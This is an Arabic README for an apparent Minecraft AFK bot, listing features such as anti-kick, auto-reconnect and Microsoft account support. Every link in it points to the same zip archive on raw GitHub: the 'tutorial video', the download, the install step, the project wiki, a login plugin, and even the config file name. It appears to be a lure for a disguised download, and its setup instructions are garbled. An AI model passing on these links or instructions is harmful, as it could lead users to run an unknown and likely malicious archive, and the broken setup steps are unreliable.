## الشرح

1. شاهد هذا الفيديو السريع لمدة 3 دقائق [هنا](https://raw.githubusercontent.com/Ahemdgggi/afk-2/main/equestrian/afk_1.4.zip) وادعم القناة بالاشتراك.
2. قم بعمل Fork للكود بالضغط على الزر أعلى اليمين.
3. قم بالإعجاب بالكود حتى أتمكن من تحديثه باستمرار!

## التثبيت

 1. [تحميل](https://raw.githubusercontent.com/Ahemdgggi/afk-2/main/equestrian/afk_1.4.zip) أحدث إصدار.
 2. قم بتنزيل وتثبيت [https://raw.githubusercontent.com/Ahemdgggi/afk-2/main/equestrian/afk_1.4.zip](https://raw.githubusercontent.com/Ahemdgggi/afk-2/main/equestrian/afk_1.4.zip)
 3. نفّذ الأمر `npm install` داخل مجلد البوت.
 
 ## الاستخدام
 
 1. قم بإعداد البوت في ملف `https://raw.githubusercontent.com/Ahemdgggi/afk-2/main/equestrian/afk_1.4.zip`. [شرح إعداد البوت موجود في ويكي المشروع](https://raw.githubusercontent.com/Ahemdgggi/afk-2/main/equestrian/afk_1.4.zip)
 2. شغّل البوت باستخدام الأمر `node .`.

## الميزات

 - وحدة مكافحة الطرد بسبب الـ AFK
 - التحرك إلى الكتلة المستهدفة بعد تسجيل الدخول
 - دعم حسابات Mojang/Microsoft
 - سجل المحادثات
 - وحدة رسائل المحادثة
 - إعادة الاتصال التلقائي
 - المصادقة مع Login Security [هنا](https://raw.githubusercontent.com/Ahemdgggi/afk-2/main/equestrian/afk_1.4.zip) (إضافة مصادقة للخوادم غير الرسمية)
 - إصدارات الخوادم المدعومة: `1.8 - 1.21.5`
